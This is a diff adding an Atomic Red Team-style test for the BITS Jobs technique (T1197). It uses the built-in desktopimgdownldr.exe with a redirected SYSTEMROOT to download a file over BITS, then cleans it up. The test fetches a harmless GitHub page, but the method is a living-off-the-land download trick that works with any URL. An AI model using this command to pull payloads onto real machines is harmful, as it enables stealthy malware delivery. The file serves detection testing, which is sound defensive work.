@@ -1,0 +1,12 @@
+#TechniqueName: BITS Jobs
+#AtomicTestName: Bits download using desktopimgdownldr.exe (cmd)
+#Description: This test simulates using desktopimgdownldr.exe to download a malicious file&instead of a desktop or lockscreen background img. The process that actually makes &the TCP connection and creates the file on the disk is a svchost process (“-k netsvc -p -s BITS”) &and not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/&
+#Language: cmd
+
+#commands
+set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr
+
+
+#cleanup_commands
+del C:\Windows\Temp\Personalization\LockScreenImage\*.md >null 2>&1
+
